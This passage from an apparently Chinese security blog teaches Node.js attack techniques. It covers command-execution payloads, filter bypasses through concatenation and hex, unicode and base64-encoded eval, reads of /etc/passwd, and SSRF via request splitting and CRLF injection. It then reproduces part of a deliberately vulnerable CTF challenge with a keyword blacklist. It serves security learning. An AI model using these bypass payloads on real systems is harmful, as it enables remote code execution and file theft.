class="string">&quot;\x61&quot;</span>); <span class="comment">//true</span></span><br></pre></td></tr></table></figure><h5 id="Unicodeç¼–ç "><a href="#Unicodeç¼–ç " class="headerlink" title="Unicodeç¼–ç "></a>Unicodeç¼–ç </h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\u0061&quot;</span>===<span class="string">&quot;a&quot;</span>); <span class="comment">//true</span></span><br></pre></td></tr></table></figure><h5 id="baseç¼–ç "><a href="#baseç¼–ç " class="headerlink" title="baseç¼–ç "></a>baseç¼–ç </h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;Y29uc29sZS5sb2coImhlbGxvIHdvcmxkIik7&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>());</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230516223000824.png" alt="image-20230516223000824"></p><h3 id="Node-jså±é™©å‡½æ•°çš„åˆ©ç”¨"><a href="#Node-jså±é™©å‡½æ•°çš„åˆ©ç”¨" class="headerlink" title="Node.jså±é™©å‡½æ•°çš„åˆ©ç”¨"></a>Node.jså±é™©å‡½æ•°çš„åˆ©ç”¨</h3><h4 id="å‘½ä»¤æ‰§è¡Œ-ä»£ç æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ-ä»£ç æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ/ä»£ç æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ/ä»£ç æ‰§è¡Œ</h4><h5 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230516223535560.png" alt="image-20230516223535560"></p><h5 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">eval</span>(<span class="string">&quot;document.cookie&quot;</span>)); <span class="comment">//æ‰§è¡Œdocument.cookie</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;document.cookie&quot;</span>); <span class="comment">//è¾“å‡ºdocument.cookie</span></span><br></pre></td></tr></table></figure><h4 id="æ–‡ä»¶è¯»å†™"><a href="#æ–‡ä»¶è¯»å†™" class="headerlink" title="æ–‡ä»¶è¯»å†™"></a>æ–‡ä»¶è¯»å†™</h4><h5 id="readFileSync"><a href="#readFileSync" class="headerlink" title="readFileSync()"></a>readFileSync()</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFile</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h5 id="readFile"><a href="#readFile" class="headerlink" title="readFile()"></a>readFile()</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="writeFileSync"><a href="#writeFileSync" class="headerlink" title="writeFileSync()"></a>writeFileSync()</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFileSync</span>(<span class="string">&#x27;input.txt&#x27;</span>,<span class="string">&#x27;sss&#x27;</span>);</span><br></pre></td></tr></table></figure><h5 id="writeFile"><a href="#writeFile" class="headerlink" title="writeFile()"></a>writeFile()</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFile</span>(<span class="string">&#x27;input.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="function">(<span class="params">err</span>)=&gt;</span>&#123;&#125;)</span><br></pre></td></tr></table></figure><h4 id="RCE-ByPass"><a href="#RCE-ByPass" class="headerlink" title="RCE_ByPass"></a>RCE_ByPass</h4><p>åŸå‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å­—ç¬¦æ‹¼æ¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&#x27;exe&#x27;</span>+<span class="string">&#x27;cSync&#x27;</span>](<span class="string">&#x27;calc&#x27;</span>); <span class="comment">//webä¸­+è®°å¾—urlç¼–ç ä¸€ä¸‹\</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;exe&quot;</span>.<span class="title function_">concat</span>(<span class="string">&quot;cSync&quot;</span>)](<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230517203250784.png" alt="image-20230517203250784"></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230517203416567.png" alt="image-20230517203416567"></p><p>ç¼–ç ç»•è¿‡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;</span>](<span class="string">&#x27;calc&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&quot;</span>](<span class="string">&#x27;calc&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdjYWxjJyk7&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>());</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230517204029425.png" alt="image-20230517204029425"></p><p>æ¨¡æ¿æ‹¼æ¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">&#x27;calc&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230517210050150.png" alt="image-20230517210050150"></p><p>å…¶ä»–å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">exec</span>(<span class="string">&quot;sleep 3&quot;</span>); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;sleep 3&quot;</span>); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execFile</span>(<span class="string">&quot;/bin/sleep&quot;</span>,[<span class="string">&quot;3&quot;</span>]); *<span class="comment">//è°ƒç”¨æŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œåœ¨ç¬¬äºŒä¸ªå‚æ•°ä¼ args* </span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">spawn</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>]); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>]); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execFileSync</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>]);</span><br></pre></td></tr></table></figure><h3 id="Node-jsä¸­çš„ssrf"><a href="#Node-jsä¸­çš„ssrf" class="headerlink" title="Node.jsä¸­çš„ssrf"></a>Node.jsä¸­çš„ssrf</h3><p>é€šè¿‡æ‹†åˆ†è¯·æ±‚å®ç°çš„ssrfæ”»å‡»</p><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>è™½ç„¶ç”¨æˆ·å‘å‡ºçš„HTTPè¯·æ±‚é€šå¸¸å°†è¯·æ±‚è·¯å¾„æŒ‡å®šä¸ºå­—ç¬¦ä¸², ä½†node.jsæœ€ç»ˆå¿…é¡»å°†è¯·æ±‚ä½œä¸ºåŸå§‹å­—èŠ‚è¾“å‡º. JavaScriptæ”¯æŒUnicodeå­—ç¬¦ä¸², å› æ­¤å°†ä»–ä»¬è½¬æ¢ä¸ºå­—èŠ‚æ„å‘³ç€é€‰æ‹©å¹¶åº”ç”¨é€‚å½“çš„Unicodeç¼–ç . å¯¹äºä¸åŒ…å«ä¸»ä½“çš„è¯·æ±‚, Node.jsé»˜è®¤ä½¿ç”¨<code>latin1</code>, è¿™æ˜¯ä¸€ç§å•å­—èŠ‚ç¼–ç , ä¸èƒ½è¡¨ç¤ºé«˜ç¼–ç çš„Unicodeå­—ç¬¦, ç›¸å, è¿™äº›å­—ç¬¦è¢«æˆªæ–­ä¸ºå…¶JavaScriptè¡¨ç¤ºçš„æœ€ä½å­—èŠ‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; v = <span class="string">&quot;/caf\u&#123;E9&#125;\u&#123;01F436&#125;&quot;</span></span><br><span class="line"><span class="string">&#x27;/cafÃ©ğŸ¶&#x27;</span></span><br><span class="line"></span><br><span class="line">&gt; <span class="title class_">Buffer</span>.<span class="title function_">from</span>(v,<span class="string">&#x27;latin1&#x27;</span>).<span class="title function_">toString</span>(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;/cafÃ©=6&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230517211743170.png" alt="image-20230517211743170"></p><h4 id="Crlf-HTTPå¤´æ³¨å…¥"><a href="#Crlf-HTTPå¤´æ³¨å…¥" class="headerlink" title="Crlf HTTPå¤´æ³¨å…¥"></a>Crlf HTTPå¤´æ³¨å…¥</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>).<span class="title function_">get</span>(<span class="string">&#x27;http://example.com/\r\n/test&#x27;</span>).<span class="property">_header</span></span><br><span class="line"><span class="string">&#x27;GET //test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230517212859932.png" alt="image-20230517212859932"></p><p>é€šè¿‡crlfç»“åˆssrfåˆ©ç”¨</p><p>é€šè¿‡ä¸€ä¸ª<a class="link" target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GYCTF2020]Node%20Game">é¢˜ç›®<i class="fas fa-external-link-alt"></i></a>å­¦ä¹ ä¸€ä¸‹</p><p>æºç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>); <span class="comment">// å¤„ç†æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">`pug`</span>); <span class="comment">// æ¨¡æ¿æ¸²æŸ“</span></span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>); <span class="comment">// æ—¥å¿—ä¸­é—´ä»¶</span></span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>); <span class="comment">// ç”¨äºå¤„ç†multipart/form-dataç±»å‹çš„è¡¨å•æ•°æ®ï¼Œå®ç°ä¸Šä¼ åŠŸèƒ½ï¼›ä¸ªäººä¸€èˆ¬ä½¿ç”¨formidableå®ç°ä¸Šä¼ </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†ä¸Šä¼ çš„æ–‡ä»¶å­˜å‚¨åœ¨./dist[è‡ªåŠ¨åˆ›å»º]è¿”å›ä¸€ä¸ªåä¸ºfileçš„æ–‡ä»¶æ•°ç»„</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">multer</span>(&#123;<span class="attr">dest</span>: <span class="string">&#x27;./dist&#x27;</span>&#125;).<span class="title function_">array</span>(<span class="string">&#x27;file&#x27;</span>));</span><br><span class="line"><span class="comment">// ä½¿ç”¨ç®€åŒ–ç‰ˆæ—¥å¿—</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">morgan</span>(<span class="string">&#x27;short&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// é™æ€æ–‡ä»¶è·¯ç”±</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/uploads&quot;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/uploads&#x27;</span>)))</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/template&quot;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/template&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="comment">// GETæ–¹æ³•è·å–actionå‚æ•°</span></span><br><span class="line">    <span class="keyword">var</span> action = req.<span class="property">query</span>.<span class="property">action</span> ? req.<span class="property">query</span>.<span class="property">action</span> : <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    <span class="comment">// actionä¸­ä¸èƒ½åŒ…å«/ &amp; \</span></span><br><span class="line">    <span class="keyword">if</span> (action.<span class="title function_">includes</span>(<span class="string">&quot;/&quot;</span>) || action.<span class="title function_">includes</span>(<span class="string">&quot;\\&quot;</span>)) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;Errrrr, You have been Blocked&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å°†/template/[action].pugæ¸²æŸ“æˆhtmlè¾“å‡ºåˆ°æ ¹ç›®å½•</span></span><br><span class="line">    file = path.<span class="title function_">join</span>(__dirname + <span class="string">&#x27;/template/&#x27;</span> + action + <span class="string">&#x27;.pug&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.<span class="title function_">renderFile</span>(file);</span><br><span class="line">    res.<span class="title function_">send</span>(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/file_upload&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.<span class="property">connection</span>.<span class="property">remoteAddress</span>; <span class="comment">// remoteAddressæ— æ³•ä¼ªé€ ï¼Œå› ä¸ºTCPæœ‰ä¸‰æ¬¡æ¡æ‰‹ï¼Œä¼ªé€ æºIPä¼šå¯¼è‡´æ— æ³•å®ŒæˆTCPè¿æ¥</span></span><br><span class="line">    <span class="keyword">var</span> obj = &#123;<span class="attr">msg</span>: <span class="string">&#x27;&#x27;</span>,&#125;</span><br><span class="line">    <span class="comment">// è¯·æ±‚å¿…é¡»æ¥è‡ªlocalhost</span></span><br><span class="line">    <span class="keyword">if</span> (!ip.<span class="title function_">includes</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">        obj.<span class="property">msg</span> = <span class="string">&quot;only admin&#x27;s ip can use it&quot;</span></span><br><span class="line">        res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fs.<span class="title function_">readFile</span>(req.<span class="property">files</span>[<span class="number">0</span>].<span class="property">path</span>, <span class="keyword">function</span> (<span class="params">err, data</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            obj.<span class="property">msg</span> = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// æ–‡ä»¶è·¯å¾„ä¸º/uploads/[mimetype]/filenameï¼Œmimetypeå¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šå®ç°å°†æ–‡ä»¶å­˜å‚¨è‡³/templateå¹¶åˆ©ç”¨actionæ¸²æŸ“åˆ°ç•Œé¢</span></span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">&#x27;/uploads/&#x27;</span> + req.<span class="property">files</span>[<span class="number">0</span>].<span class="property">mimetype</span> + <span class="string">&quot;/&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.<span class="property">files</span>[<span class="number">0</span>].<span class="property">originalname</span></span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(__dirname + file_path)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.<span class="title function_">mkdirSync</span>(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.<span class="property">msg</span> = <span class="string">&quot;file type error&quot;</span>;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.<span class="title function_">writeFileSync</span>(dir_file, data)</span><br><span class="line">                obj = &#123;<span class="attr">msg</span>: <span class="string">&#x27;upload success&#x27;</span>, <span class="attr">filename</span>: file_path + file_name&#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.<span class="property">msg</span> = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŸ¥çœ‹é¢˜ç›®æºç </span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname + <span class="string">&#x27;/template/source.txt&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/core&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:8081/source?&#x27;</span> + q</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(url)</span><br><span class="line">        <span class="comment">// å¯¹urlå­—ç¬¦è¿›è¡Œwaf</span></span><br><span class="line">        <span class="keyword">var</span> trigger = <span class="title function_">blacklist</span>(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;error occurs!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// nodeå¯¹/sourceå‘å‡ºè¯·æ±‚ï¼Œæ­¤å¤„å¯ä»¥åˆ©ç”¨å­—ç¬¦ç ´åè¿›è¡Œåˆ‡åˆ†æ”»å‡»è®¿é—®/file_uploadè·¯ç”±(â—ï¸æ­¤è¯·æ±‚å‘å‡ºè€…ä¸ºlocalhostä¸»æœº)ï¼Œå®ç°å¯¹remoteAddressçš„ç»•è¿‡</span></span><br><span class="line">                http.<span class="title function_">get</span>(url, <span class="keyword">function</span> (<span class="params">resp</span>) &#123;</span><br><span class="line">                    resp.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    resp.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (err.<span class="property">code</span> === <span class="string">&quot;ECONNRESET&quot;</span>) &#123;</span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Timeout occurs&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                    <span class="comment">// è¿”å›ç»“æœè¾“å‡ºåˆ°/core</span></span><br><span class="line">                    resp.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span> (<span class="params">chunk</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            resps = chunk.<span class="title function_">toString</span>();</span><br><span class="line">                            res.<span class="title function_">send</span>(resps);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                            res.<span class="title function_">send</span>(e.<span class="property">message</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                        res.<span class="title function_">send</span>(e.<span class="property">message</span>);</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…³é”®å­—waf åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥å®ç°ç»•è¿‡</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">blacklist</span>(<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">&quot;global&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;mainModule&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;child_process&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;!&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.<span class="property">length</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.<span class="title function_">includes</span>(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span 